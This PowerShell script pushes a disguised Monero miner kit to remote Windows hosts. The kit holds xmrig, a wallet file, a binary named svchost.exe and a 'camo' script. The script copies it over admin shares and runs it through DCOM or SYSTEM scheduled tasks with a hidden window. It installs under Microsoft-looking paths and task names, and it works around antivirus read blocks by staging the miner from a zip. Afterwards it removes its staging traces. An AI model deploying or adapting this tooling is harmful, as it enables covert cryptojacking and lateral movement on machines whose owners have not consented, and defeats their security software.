<#
.SYNOPSIS
    Push the CloudSync miner kit to one or more Windows machines and install it there.

.DESCRIPTION
    Run this from the workstation that holds the kit (F:\Test Miner). For every target:

      1. connects to \\<host>\C$  (with -Credential, or the current account)
      2. copies the installer payload to C:\Windows\Temp\TestMiner-<stamp>
      3. starts remote-run.ps1 there through DCOM (Win32_Process), falling back to
         schtasks running as SYSTEM
      4. waits for the installer's exit code, then verifies install.json, state.json,
         the two scheduled tasks and the controller process
      5. deletes the staging folder (unless -KeepStaging)

    install-task.ps1 installs into %LOCALAPPDATA% by default. Over a remote push that
    would be the *installer account's* profile, so this script installs machine-wide
    into C:\ProgramData\Microsoft\CloudSync instead. That fits the task principal the
    installer registers (BUILTIN\Users, "any user who logs on"); the folder is
    pre-created and BUILTIN\Users is granted Modify on it, otherwise the Limited
    controller could not write state.json / its log.

    Requirements on the target: SMB (445) + RPC reachable, the push account is a local
    administrator, Python present or installable (the installer fetches 3.12 per-user,
    which needs one WAN connection on the target).

.PARAMETER ComputerName
    One or more hostnames or IPs.

.PARAMETER Credential
    Local administrator credentials for the targets. Omit when the current account
    already has admin on them.

.PARAMETER InstallDir
    Install path on the target. Default C:\ProgramData\Microsoft\CloudSync.

.PARAMETER Source
    Local kit folder. Default: the folder holding this script.

.PARAMETER ZipPath
    Kit zip used when a file in -Source cannot be read. On a box where the active
    AV blocks reads of the miner binary or its config (ESET does exactly this:
    reads are denied while the file stays in place and readable metadata), the
    staged copy is written straight out of this zip instead. Defaults to
    '<Source>.zip' (F:\Test Miner.zip).

.PARAMETER SkipGpuProbe
    Passed to install-task.ps1 (no OpenCL probe, CPU-only install).

.PARAMETER CleanLegacy
    Passed to install-task.ps1 (remove the pre-overhaul controller, its task and files).

.PARAMETER SkipPowerProfile
    Passed to install-task.ps1 as -NoMaxPower (leave the power plan alone).

.PARAMETER DryRun
    Copy the payload and report, but do not launch the installer.

.PARAMETER KeepStaging
    Leave C:\Windows\Temp\TestMiner-* on the target.

.PARAMETER TimeoutMinutes
    How long to wait for a single target to finish installing. Default 20.

.EXAMPLE
    .\install-remote.ps1 -ComputerName DESKTOP-7H2K9LQ -Credential (Get-Credential)

.EXAMPLE
    $c = Get-Credential; .\install-remote.ps1 -ComputerName 192.168.4.60,192.168.4.61 -Credential $c -CleanLegacy

.EXAMPLE
    .\install-remote.ps1 -ComputerName LAB-PC -Credential $c -DryRun
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string[]]$ComputerName,

    [pscredential]$Credential,

    [string]$InstallDir = 'C:\ProgramData\Microsoft\CloudSync',

    [string]$Source = $PSScriptRoot,

    [string]$ZipPath,

    [switch]$SkipGpuProbe,
    [switch]$CleanLegacy,
    [switch]$SkipPowerProfile,
    [switch]$DryRun,
    [switch]$KeepStaging,

    [int]$TimeoutMinutes = 20
)

$ErrorActionPreference = 'Stop'

# ------------------------------------------------------------------ payload
$payload = @(
    # modular runtime only: no flat controller.py / gpudetect.py, no docs, no
    # uninstaller. config_high.json is still the worker config template.
    'config_high.json', 'gpudetect.py', 'manifest.json',
    'wallet.txt', 'watchdog.ps1', 'install-task.ps1',
    'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
    'REMOTE.cmd'
)
$binaries = @('CloudSync.exe', 'xmrig.exe', 'svchost.exe', 'WinSync.exe', 'WinRing0x64.sys')

if (-not $Source) { $Source = (Get-Location).Path }
if (-not (Test-Path (Join-Path $Source 'install-task.ps1'))) {
    throw "install-task.ps1 not found in '$Source' - run this from the kit folder or pass -Source."
}

$present = @($payload + $binaries | Where-Object { Test-Path (Join-Path $Source $_) })
if (-not (Test-Path (Join-Path $Source 'cloudsync\__main__.py'))) { throw "cloudsync\__main__.py missing from $Source - this kit is modular-only" }
if (-not (($present -contains 'CloudSync.exe') -or ($present -contains 'xmrig.exe'))) {
    throw "no miner binary in $Source (CloudSync.exe / xmrig.exe)"
}
$copyList = @($payload | Where-Object { Test-Path (Join-Path $Source $_) })
$binCopy = @($binaries | Where-Object { Test-Path (Join-Path $Source $_) })

$extraArgs = @()
if ($SkipGpuProbe) { $extraArgs += '-SkipGpuProbe' }
if ($CleanLegacy) { $extraArgs += '-CleanLegacy' }
if ($SkipPowerProfile) { $extraArgs += '-NoMaxPower' }
$extraText = ($extraArgs -join ' ')

# ------------------------------------------------------------------ zip fallback
# ESET (and some other on-access scanners) can deny READ on the miner binary and
# its config while still letting the file be renamed/deleted - writing a fresh copy
# of the same bytes does not help. The kit zip is readable, so any file the AV
# blocks is staged straight out of the zip instead.
if (-not $ZipPath) { $ZipPath = [IO.Path]::ChangeExtension($Source.TrimEnd('\'), '.zip') }
Add-Type -AssemblyName System.IO.Compression.FileSystem | Out-Null

$script:kitZip = $null
$script:kitZipTried = $false
$script:manifestHashes = @{}
$manifestPath = Join-Path $Source 'manifest.json'
if (Test-Path $manifestPath) {
    try {
        $m = Get-Content -LiteralPath $manifestPath -Raw | ConvertFrom-Json
        foreach ($entry in @($m.files)) {
            if ($entry.path -and $entry.sha256) { $script:manifestHashes[$entry.path] = $entry.sha256.ToLower() }
        }
    } catch { }
}

function Test-Readable ($Path) {
    try { $fs = [IO.File]::Open($Path, 'Open', 'Read', 'ReadWrite'); $fs.Close(); return $true }
    catch { return $false }
}

function Open-KitZip {
    if ($script:kitZip) { return $script:kitZip }
    if (-not $script:kitZipTried) {
        $script:kitZipTried = $true
        if (Test-Path $ZipPath) { $script:kitZip = [System.IO.Compression.ZipFile]::OpenRead($ZipPath) }
    }
    return $script:kitZip
}

function Copy-Payload {
    # returns @{ Source = 'disk'|'zip'; Sha256 = <hex> } - the hash is taken from
    # the bytes we actually hand to the target, never read back, because an
    # on-access scanner can deny reads of the staged copy too.
    param([string]$Name, [string]$Dest)
    $srcPath = Join-Path $Source $Name
    if (Test-Readable $srcPath) {
        Copy-Item -LiteralPath $srcPath -Destination $Dest -Force
        $h = $null
        try { $h = (Get-FileHash -LiteralPath $Dest -Algorithm SHA256).Hash.ToLower() } catch { }
        if (-not $h) {
            try { $h = (Get-FileHash -LiteralPath $srcPath -Algorithm SHA256).Hash.ToLower() } catch { }
        }
        return @{ Source = 'disk'; Sha256 = $h }
    }
    $zip = Open-KitZip
    if (-not $zip) { throw "cannot read $srcPath and no kit zip at $ZipPath" }
    $entry = $null
    foreach ($e in $zip.Entries) {
        if ($e.Name -eq $Name) { $entry = $e; break }
    }
    if (-not $entry) { throw "cannot read $srcPath and '$Name' is not in $ZipPath" }
    $ms = New-Object System.IO.MemoryStream
    $st = $entry.Open()
    $st.CopyTo($ms)
    $st.Close()
    $bytes = $ms.ToArray()
    $ms.Close()
    $h = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-', '').ToLower()
    [IO.File]::WriteAllBytes($Dest, $bytes)
    return @{ Source = 'zip'; Sha256 = $h }
}

# ------------------------------------------------------------------ helpers
function Write-Step ($computer, $text) { Write-Host ("[{0}] {1}" -f $computer, $text) }
function Write-Ok ($computer, $text) { Write-Host ("[{0}]   OK   {1}" -f $computer, $text) -ForegroundColor Green }
function Write-Warn2 ($computer, $text) { Write-Host ("[{0}]   WARN {1}" -f $computer, $text) -ForegroundColor Yellow }
function Write-Fail ($computer, $text) { Write-Host ("[{0}]   FAIL {1}" -f $computer, $text) -ForegroundColor Red }

function Connect-AdminShare {
    param([string]$Computer, [pscredential]$Cred)

    $share = "\\$Computer\C$"
    if (-not $Cred) {
        if (-not (Test-Path "$share\Windows")) {
            throw "cannot read $share with the current account - pass -Credential"
        }
        return $share
    }

    $user = $Cred.UserName
    $pass = $Cred.GetNetworkCredential().Password
    try {
        Remove-SmbMapping -RemotePath $share -Force -ErrorAction SilentlyContinue
    } catch { }
    try {
        New-SmbMapping -RemotePath $share -UserName $user -Password $pass -ErrorAction Stop | Out-Null
        return $share
    } catch {
        # 1219 = an existing session with different credentials; drop it and retry
        cmd /c "net use `"$share`" /delete /y" 2>&1 | Out-Null
        New-SmbMapping -RemotePath $share -UserName $user -Password $pass -ErrorAction Stop | Out-Null
        return $share
    }
}

function New-DcomSession {
    param([string]$Computer, [pscredential]$Cred)
    $opt = New-CimSessionOption -Protocol Dcom
    if ($Cred) {
        New-CimSession -ComputerName $Computer -Credential $Cred -SessionOption $opt -ErrorAction Stop
    } else {
        New-CimSession -ComputerName $Computer -SessionOption $opt -ErrorAction Stop
    }
}

function Invoke-RemoteCommand {
    # DCOM Win32_Process first (returns a PID, runs elevated as the push account),
    # schtasks/SYSTEM as the fallback.
    param(
        [string]$Computer,
        [pscredential]$Cred,
        [string]$CommandLine,
        [string]$TaskName = 'TestMinerRemote'
    )

    $cim = $null
    try {
        $cim = New-DcomSession -Computer $Computer -Cred $Cred
        $r = Invoke-CimMethod -CimSession $cim -ClassName Win32_Process -MethodName Create `
            -Arguments @{ CommandLine = $CommandLine } -ErrorAction Stop
        if ($r.ReturnValue -eq 0) { return @{ Method = 'dcom'; Pid = $r.ProcessId; Session = $cim } }
        Write-Warn2 $Computer ("Win32_Process.Create returned {0} - trying schtasks" -f $r.ReturnValue)
    } catch {
        Write-Warn2 $Computer ("DCOM launch failed ({0}) - trying schtasks/SYSTEM" -f $_.Exception.Message)
    }

    $tr = $CommandLine
    $sargs = @('/create', '/s', $Computer, '/tn', "\$TaskName", '/tr', $tr,
                '/sc', 'once', '/st', '00:00', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f')
    if ($Cred) {
        $sargs += @('/u', $Cred.UserName, '/p', $Cred.GetNetworkCredential().Password)
    }
    $out = & schtasks.exe @sargs 2>&1
    if ($LASTEXITCODE -ne 0) { throw ("schtasks /create failed: " + (($out | Out-String).Trim())) }

    $rargs = @('/run', '/s', $Computer, '/tn', "\$TaskName")
    if ($Cred) { $rargs += @('/u', $Cred.UserName, '/p', $Cred.GetNetworkCredential().Password) }
    & schtasks.exe @rargs 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "schtasks /run failed" }

    return @{ Method = 'schtasks'; Pid = $null; Session = $cim; TaskName = $TaskName }
}

function Remove-RemoteTask {
    param([string]$Computer, [pscredential]$Cred, [string]$TaskName)
    if (-not $TaskName) { return }
    $a = @('/delete', '/s', $Computer, '/tn', "\$TaskName", '/f')
    if ($Cred) { $a += @('/u', $Cred.UserName, '/p', $Cred.GetNetworkCredential().Password) }
    & schtasks.exe @a 2>&1 | Out-Null
}

function Wait-RemoteExit {
    param([string]$Computer, [string]$Stage, [int]$Minutes)
    $deadline = (Get-Date).AddMinutes($Minutes)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 5
        $f = Join-Path $Stage 'exitcode.txt'
        if (Test-Path $f) {
            $raw = (Get-Content -LiteralPath $f -Raw -ErrorAction SilentlyContinue)
            if ($null -ne $raw -and $raw.Trim() -ne '') { return [int]$raw.Trim() }
        }
    }
    return $null
}

function Get-RemoteLogTail {
    param([string]$Stage, [int]$Lines = 30)
    $f = Join-Path $Stage 'remote-install.log'
    if (-not (Test-Path $f)) { return @() }
    return @(Get-Content -LiteralPath $f -Tail $Lines -ErrorAction SilentlyContinue)
}

# ------------------------------------------------------------------ one host
function Install-One {
    param([string]$Computer)

    $res = [pscustomobject]@{
        Computer  = $Computer
        Copied    = $false
        Installed = $false
        ExitCode  = $null
        Method    = ''
        Tasks     = '?'
        Process   = '?'
        Note      = ''
    }

    $share = $null
    $stage = $null
    $launch = $null

    try {
        Write-Step $Computer 'connecting'
        if (-not (Test-Connection -ComputerName $Computer -Count 1 -Quiet -ErrorAction SilentlyContinue)) {
            Write-Warn2 $Computer 'no ICMP reply - continuing anyway (SMB/RPC may still work)'
        }
        $share = Connect-AdminShare -Computer $Computer -Cred $Credential
        Write-Ok $Computer "share: $share"

        $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
        $stageName = "TestMiner-$stamp"
        $stage = Join-Path $share "Windows\Temp\$stageName"
        New-Item -ItemType Directory -Force -Path $stage | Out-Null

        Write-Step $Computer ("copying {0} files" -f ($copyList.Count + $binCopy.Count))
        $fromZip = @()
        foreach ($f in @($copyList + $binCopy)) {
            $destFile = Join-Path $stage $f
            $put = Copy-Payload -Name $f -Dest $destFile
            if ($put.Source -eq 'zip') { $fromZip += $f }
            if ($script:manifestHashes.ContainsKey($f)) {
                $want = $script:manifestHashes[$f]
                if ($put.Sha256 -and $put.Sha256 -ne $want) {
                    throw ("staged {0} does not match manifest.json ({1} != {2})" -f $f, $put.Sha256.Substring(0, 12), $want.Substring(0, 12))
                }
            }
        }
        if ($fromZip.Count -gt 0) {
            Write-Warn2 $Computer ("AV blocked local reads - staged from the zip: {0}" -f ($fromZip -join ', '))
        }
        $res.Copied = $true
        Write-Ok $Computer ("staged at C:\Windows\Temp\$stageName")

        # the runner: pre-creates the machine-wide install dir, grants Users modify,
        # then runs the real installer and records its exit code
        $runner = @'
$ErrorActionPreference = 'Continue'
$stage = Split-Path -Parent $MyInvocation.MyCommand.Path
$log = Join-Path $stage 'remote-install.log'
$exitFile = Join-Path $stage 'exitcode.txt'
$dir = '__INSTALLDIR__'
try {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $admin = (New-Object Security.Principal.WindowsPrincipal $id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    "runner: host=$env:COMPUTERNAME user=$($id.Name) admin=$admin stage=$stage" | Out-File -FilePath $log -Encoding utf8
    if (-not $admin) {
        'runner: NOT ELEVATED - aborting (exit 90)' | Out-File -Append -FilePath $log -Encoding utf8
        Set-Content -Path $exitFile -Value 90
        exit 90
    }
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    & icacls.exe $dir /grant '*S-1-5-32-545:(OI)(CI)M' /T /C 2>&1 |
        Out-File -Append -FilePath $log -Encoding utf8
    "runner: running install-task.ps1 -NoPrompt -InstallDir $dir __EXTRA__" | Out-File -Append -FilePath $log -Encoding utf8
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $stage 'install-task.ps1') `
        -NoPrompt -InstallDir $dir __EXTRA__ 2>&1 |
        Out-File -Append -FilePath $log -Encoding utf8
    $code = $LASTEXITCODE
    if ($null -eq $code) { $code = 1 }
    "runner: installer exit=$code" | Out-File -Append -FilePath $log -Encoding utf8
    Set-Content -Path $exitFile -Value $code
} catch {
    "runner: EXCEPTION $($_.Exception.Message)" | Out-File -Append -FilePath $log -Encoding utf8
    Set-Content -Path $exitFile -Value 91
}
'@
        $runner = $runner.Replace('__INSTALLDIR__', $InstallDir).Replace('__EXTRA__', $extraText)
        Set-Content -LiteralPath (Join-Path $stage 'remote-run.ps1') -Value $runner -Encoding UTF8

        if ($DryRun) {
            Write-Ok $Computer 'dry run - installer not launched'
            $res.Installed = $false
            $res.ExitCode = 0
            $res.Note = 'dry run'
            return $res
        }

        $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\Temp\$stageName\remote-run.ps1`""
        Write-Step $Computer 'launching installer'
        $launch = Invoke-RemoteCommand -Computer $Computer -Cred $Credential -CommandLine $cmd
        $res.Method = $launch.Method
        Write-Ok $Computer ("launched via {0}{1}" -f $launch.Method, $(if ($launch.Pid) { " pid=$($launch.Pid)" } else { '' }))

        Write-Step $Computer ("waiting up to {0} min for the installer" -f $TimeoutMinutes)
        $code = Wait-RemoteExit -Computer $Computer -Stage $stage -Minutes $TimeoutMinutes
        $res.ExitCode = $code

        $tail = Get-RemoteLogTail -Stage $stage
        if ($code -eq $null) {
            Write-Fail $Computer 'installer did not report an exit code (timeout) - last log lines:'
            $tail | ForEach-Object { Write-Host ("[{0}]      {1}" -f $Computer, $_) }
            $res.Note = 'timeout'
            return $res
        }
        if ($code -ne 0) {
            Write-Fail $Computer ("installer exit={0} - last log lines:" -f $code)
            $tail | ForEach-Object { Write-Host ("[{0}]      {1}" -f $Computer, $_) }
            $res.Note = "exit=$code"
            return $res
        }
        Write-Ok $Computer 'installer exit=0'

        # ---- verification over the admin share ----
        $uncInstall = Join-Path $share ($InstallDir -replace '^[A-Za-z]:\\', '')
        # Either runtime counts as installed: a flat install has controller.py, a
        # modular install has cloudsync\__main__.py and deliberately no
        # controller.py. Checking only controller.py reported every modular
        # deploy as a failure (found 2026-11-11).
        $flatEntry = Test-Path (Join-Path $uncInstall 'controller.py')
        $modEntry = Test-Path (Join-Path $uncInstall 'cloudsync\__main__.py')
        $res.Installed = ($flatEntry -or $modEntry)
        if ($res.Installed) {
            $runtimeFound = if ($modEntry) { 'modular' } else { 'flat' }
            Write-Ok $Computer ("installed ({0} runtime, entry present)" -f $runtimeFound)
        } else {
            Write-Fail $Computer 'no runtime entry after install (controller.py and cloudsync\__main__.py both missing)'
        }

        $ij = Join-Path $uncInstall 'install.json'
        if (Test-Path $ij) {
            try {
                $info = Get-Content -LiteralPath $ij -Raw | ConvertFrom-Json
                Write-Ok $Computer ("install.json: binary={0} tasks={1}" -f $info.binary, (@($info.tasks) -join ';'))
            } catch { Write-Warn2 $Computer 'install.json unreadable' }
        } else { Write-Warn2 $Computer 'install.json missing' }

        $st = Join-Path $uncInstall 'state.json'
        if (Test-Path $st) {
            try {
                $s = Get-Content -LiteralPath $st -Raw | ConvertFrom-Json
                Write-Ok $Computer ("controller alive: pid={0} gpu={1}" -f $s.pid, $s.gpu)
                $res.Process = 'running'
            } catch { Write-Warn2 $Computer 'state.json unreadable' }
        } else {
            Write-Warn2 $Computer 'no state.json yet (controller may still be starting)'
            $res.Process = 'starting'
        }

        $targs = @('/query', '/s', $Computer, '/tn', '\Microsoft\Windows\CloudSync\CloudSync')
        if ($Credential) { $targs += @('/u', $Credential.UserName, '/p', $Credential.GetNetworkCredential().Password) }
        & schtasks.exe @targs 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) { Write-Ok $Computer 'main task registered'; $res.Tasks = 'ok' }
        else { Write-Warn2 $Computer 'main task NOT found'; $res.Tasks = 'missing' }

        return $res
    } catch {
        $res.Note = $_.Exception.Message
        Write-Fail $Computer $_.Exception.Message
        return $res
    } finally {
        try { if ($launch -and $launch.Session) { Remove-CimSession -CimSession $launch.Session -ErrorAction SilentlyContinue } } catch { }
        if ($launch -and $launch.TaskName) { Remove-RemoteTask -Computer $Computer -Cred $Credential -TaskName $launch.TaskName }
        if ($stage -and -not $KeepStaging -and -not $DryRun) {
            try { Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        }
        if ($share) { try { Remove-SmbMapping -RemotePath $share -Force -ErrorAction SilentlyContinue } catch { } }
    }
}

# ------------------------------------------------------------------ main
Write-Host ""
Write-Host "=== CloudSync remote install ==="
Write-Host ("source     : {0}" -f $Source)
Write-Host ("install dir: {0}" -f $InstallDir)
Write-Host ("targets    : {0}" -f ($ComputerName -join ', '))
Write-Host ""

$blocked = @(@($copyList + $binCopy) | Where-Object { -not (Test-Readable (Join-Path $Source $_)) })
if ($blocked.Count -gt 0) {
    Write-Host ("AV blocks local reads of: {0}" -f ($blocked -join ', ')) -ForegroundColor Yellow
    if (Test-Path $ZipPath) {
        Write-Host ("  -> those files are staged from {0}" -f $ZipPath) -ForegroundColor Yellow
    } else {
        throw "AV blocks reads of $($blocked -join ', ') and there is no kit zip at $ZipPath - add an AV exclusion for '$Source' or pass -ZipPath"
    }
}

$results = @()
foreach ($c in $ComputerName) {
    $results += Install-One -Computer $c
    Write-Host ""
}

Write-Host "==================== SUMMARY ===================="
$results | Format-Table Computer, Copied, Installed, ExitCode, Method, Tasks, Process, Note -AutoSize | Out-String -Width 200
Write-Host ""

$bad = @($results | Where-Object { $_.ExitCode -ne 0 -or (-not $_.Installed -and -not $DryRun) })
if ($bad.Count -gt 0) {
    Write-Host ("{0} of {1} target(s) did not finish cleanly." -f $bad.Count, $results.Count)
    exit 1
}
if ($DryRun) { Write-Host ("dry run: {0} target(s) staged." -f $results.Count) }
else { Write-Host ("all {0} target(s) installed." -f $results.Count) }
if ($script:kitZip) { $script:kitZip.Dispose() }
exit 0
